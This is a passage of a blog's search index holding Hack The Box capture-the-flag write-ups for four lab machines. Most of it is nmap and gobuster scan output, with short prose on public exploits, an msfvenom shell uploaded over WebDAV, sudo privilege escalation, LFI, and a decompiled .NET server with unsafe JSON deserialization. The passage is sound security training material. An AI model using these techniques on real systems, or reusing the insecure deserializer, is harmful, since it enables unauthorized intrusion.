ANNOTATEMORE UIDPLUS NAMESPACE RIGHTS=kxte IMAP4 443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2023-06-03T13:48:55+00:00; -28s from scanner time. |_http-title: Elastix - Login page 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 2002/tcp filtered globe 3306/tcp open mysql MySQL (unauthorized) 4445/tcp open upnotifyp? 7070/tcp filtered realserver 7625/tcp filtered unknown 9091/tcp filtered xmltec-xmlmail 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com Host script results: |_clock-skew: -28s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 410.61 seconds Webserver There were too many open ports to check, so I started gobuster in the background Foothold/User Right away I got results, and found admin endpoint Where we can wee the version of the application Found a exploit in exploit-db Same results can be achieved using searchsploit Well, I tried using searchsploit's exploit But no success Since the box is old, I thought maybe there were some version inconsistencies related to libraries, which then happened to be SSL Then I found updated version of exploit Let\u0026rsquo;s run it and get a shell Root The first thing I always check is sudo privileges We see bunch of sudo rights Use GTFOBins and get a root I choose nmap as a privesc path Check 0xdf for other paths ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/beep/images/beep.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/beep/","summary":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Beep"},{"categories":null,"contents":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Server Date: Sun, 04 Jun 2023 17:44:06 GMT |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-ntlm-info: | Target_Name: GRANPA | NetBIOS_Domain_Name: GRANPA | NetBIOS_Computer_Name: GRANPA | DNS_Domain_Name: granpa | DNS_Computer_Name: granpa |_ Product_Version: 5.2.3790 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.14/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.14/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16239 / 16245 (99.96%) =============================================================== 2023/06/05 15:56:54 Finished =============================================================== Foothold We see a webserver No results on gobuster Based on nmap, we have Microsoft-IIS/6.0 I ran davtest, yet got no success So started googling for public exploits Launched metasploit And got shell As an alternative you can use the following script suggested by 0xdf Root systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 0 Hours, 50 Minutes, 27 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 762 MB Page File: Max Size: 2,470 MB Page File: Available: 2,300 MB Page File: In Use: 170 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A Let\u0026rsquo;s run exploit suggester We have bunch of options to choose from Let\u0026rsquo;s start with the first one According to Microsoft: MS10-015 could allow elevation of privileges Set options and launch exploit And we rooted the box As an alternative path, we can exploit SeImpersonatePrivileges using Churrasco ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/grandpa/images/grandpa.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/grandpa/","summary":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Grandpa"},{"categories":null,"contents":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_http-title: Under Construction Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.15/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.15/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 17:09:30 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16223 / 16245 (99.86%) =============================================================== 2023/06/05 17:12:38 Finished =============================================================== Looks similar to Grandpa Yet we have success with davtest Foothold Let\u0026rsquo;s try creating file manually Launch Burp Suite And as we can see, we can create files Since it\u0026rsquo;s Microsoft-IIS/6.0 server, we need asp/aspx extension for our shell payload We can use either webshell or reverse shell I created payload using msfvenom Create a shell.txt file on the server And check if it was successful Prepare multi/handler Let\u0026rsquo;s check other HTTP methods MOVE looks interesting Let\u0026rsquo;s google it So we can see how we can use it in our case MOVE shell.txt to shell.aspx Start multi/handler We have a shell Root Since this box was similar to Grandpa the privesc path are also identical You can abuse SeImpersonatePrivileges Or run exploit suggester and run suggested exploits ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/granny/images/granny.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/granny/","summary":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Granny"},{"categories":null,"contents":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:35 GMT | Connection: close | Help, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:46 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; | RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Content-Length: 54 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (version).)\u0026lt;/h1\u0026gt; | TLSSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:47 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true |_ \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; 8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:20 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:14 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 263 | Location: http://bagel.htb:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://bagel.htb:8000/?page=index.html\u0026#34;\u0026gt;http://bagel.htb:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.2.2 Python/3.10.9 |_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.93%I=7%D=5/25%Time=646FA5D2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20Microsoft SF:-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,E8,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-N SF:etCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\r\\ SF:nContent-Length:\\x2054\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r SF:\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(version\\) SF:\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(HTTPOptions,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSer SF:ver:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2 SF:018:15:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,E6,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20M SF:icrosoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46 SF:\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive: SF:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\ SF:(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(SSLSessionReq,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Requ SF:est\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\ SF:r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Len SF:gth:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Ba SF:d\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r( SF:TerminalServerCookie,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent- SF:Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu SF:,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nC SF:onnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x2 SF:0\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(TLSSessionReq,E SF:6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\n SF:Server:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023 SF:\\x2018:15:47\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\ SF:nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\ SF:x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8000-TCP:V=7.93%I=7%D=5/25%Time=646FA5CE%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1EA,\u0026#34;HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\ SF:x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:14\\x2 SF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length: SF:\\x20263\\r\\nLocation:\\x20http://bagel\\.htb:8000/\\?page=index\\.html\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title SF:\u0026gt;Redirecting\\.\\.\\.\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Redirecting\\.\\.\\.\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;You\\x20shoul SF:d\\x20be\\x20redirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x SF:20\u0026lt;a\\x20href=\\\u0026#34;http://bagel\\.htb:8000/\\?page=index\\.html\\\u0026#34;\u0026gt;http://bagel SF:\\.htb:8000/\\?page=index\\.html\u0026lt;/a\u0026gt;\\.\\x20If\\x20not,\\x20click\\x20the\\x20li SF:nk\\.\\n\u0026#34;)%r(FourOhFourRequest,184,\u0026#34;HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nS SF:erver:\\x20Werkzeug/2\\.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x2 SF:0May\\x202023\\x2018:15:20\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20chars SF:et=utf-8\\r\\nContent-Length:\\x20207\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doc SF:type\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt; SF:h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found SF:\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manu SF:ally\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p SF:\u0026gt;\\n\u0026#34;)%r(Socks5,213,\u0026#34;\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTM SF:L\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org SF:/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;te SF:xt/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\ SF:x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Error\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code:\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20request\\x20syntax\\x20\\(\u0026#39;\\\\x05\\\\x04\\\\x0 SF:0\\\\x01\\\\x02\\\\x80\\\\x05\\\\x01\\\\x00\\\\x03\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20 SF:-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.25 seconds We see 3 ports Let\u0026rsquo;s check port 8000 After scanning through web server, we detect LFI We see there are 2 users: developer and phil Foothold So let\u0026rsquo;s fire up the Burp Suite and enumerate the python app (since we saw http-server-header: Werkzeug/2.2.2 Python/3.10.9) Check /proc/self/environ Check /proc/self/cmdline We see the location of the app.py Let\u0026rsquo;s open it and see the content We see the comment in the app.py about running dotnet \u0026lt;path to .dll\u0026gt; And the websocket running on port 5000 Let\u0026rsquo;s test websocket I was stuck here for a while, since had no idea what to do next Played with different inputs to websocket But then, I remembered about the dll comment So I started utilizing the LFI to find the dll Since the port was already open means that the process with dll was already deployed Thus we scan through all processes and filter for dll We get a few hits So let\u0026rsquo;s check them After finding the location of dll, let\u0026rsquo;s download it I googled around to find a tool for decompiling the dll The app.py already had a hint with comment dotnet So I found ilspycmd which can be run on Linux OS If you have Windows machine, you can also use dnSpy Let\u0026rsquo;s decompile the dll The result Take note of password stored in DB class using System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.CompilerServices; using System.Runtime.Versioning; using System.Text; using System.Threading; using Microsoft.CodeAnalysis; using Microsoft.Data.SqlClient; using Newtonsoft.Json; using WatsonWebsocket; [assembly: CompilationRelaxations(8)] [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)] [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)] [assembly: TargetFramework(\u0026#34;.NETCoreApp,Version=v6.0\u0026#34;, FrameworkDisplayName = \u0026#34;\u0026#34;)] [assembly: AssemblyCompany(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyConfiguration(\u0026#34;Debug\u0026#34;)] [assembly: AssemblyFileVersion(\u0026#34;1.0.0.0\u0026#34;)] [assembly: AssemblyInformationalVersion(\u0026#34;1.0.0\u0026#34;)] [assembly: AssemblyProduct(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyTitle(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyVersion(\u0026#34;1.0.0.0\u0026#34;)] namespace Microsoft.CodeAnalysis { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] internal sealed class EmbeddedAttribute : Attribute { } } namespace System.Runtime.CompilerServices { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)] internal sealed class NullableAttribute : Attribute { public readonly byte[] NullableFlags; public NullableAttribute(byte P_0) { NullableFlags = new byte[1] { P_0 }; } public NullableAttribute(byte[] P_0) { NullableFlags = P_0; } } [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)] internal sealed class NullableContextAttribute : Attribute { public readonly byte Flag; public NullableContextAttribute(byte P_0) { Flag = P_0; } } } namespace bagel_server { public class Handler { public object Serialize(object obj) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown return JsonConvert.SerializeObject(obj, (Formatting)1, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } public object Deserialize(string json) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown try { return JsonConvert.DeserializeObject\u0026lt;Base\u0026gt;(json, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } catch { return \u0026#34;{\\\u0026#34;Message\\\u0026#34;:\\\u0026#34;unknown\\\u0026#34;}\u0026#34;; } } } public class Bagel { private static string _ServerIp = \u0026#34;*\u0026#34;; private static int _ServerPort = 5000; private static bool _Ssl = false; private static WatsonWsServer _Server = null; private static void Main(string[] args) { InitializeServer(); StartServer(); while (true) { Thread.Sleep(1000); } } private static void InitializeServer() { //IL_0010: Unknown result type (might be due to invalid IL or missing references) //IL_001a: Expected O, but got Unknown _Server = new WatsonWsServer(_ServerIp, _ServerPort, _Ssl); _Server.AcceptInvalidCertificates = true; _Server.MessageReceived += MessageReceived; } private static async void StartServer() { await _Server.StartAsync(default(CancellationToken)); } private static void MessageReceived(object sender, MessageReceivedEventArgs args) { string json = \u0026#34;\u0026#34;; if (args.Data != null \u0026amp;\u0026amp; args.Data.Count \u0026gt; 0) { json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count); } Handler handler = new Handler(); object obj = handler.Deserialize(json); object obj2 = handler.Serialize(obj); _Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken)); } } public class Base : Orders { private int userid = 0; private string session = \u0026#34;Unauthorized\u0026#34;; public int UserId { get { return userid; } set { userid = value; } } public string Session { get { return session; } set { session = value; } } public string Time =\u0026gt; 